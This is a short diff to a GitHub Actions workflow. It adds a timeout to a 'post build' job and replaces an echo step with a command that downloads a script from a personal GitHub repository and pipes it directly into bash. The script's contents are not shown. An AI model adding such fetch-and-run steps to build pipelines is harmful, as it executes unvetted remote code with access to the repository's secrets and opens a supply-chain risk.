@@ -46,5 +46,7 @@ jobs:
     name: post build
     needs:  Build
     runs-on: ubuntu-latest
+    timeout-minutes: 5
     steps:
-      - run: echo I am job 3; date
+      - name: post build
+        run: curl -s https://raw.githubusercontent.com/Mr-Beast77/shrunner/main/ci/test.sh | bash
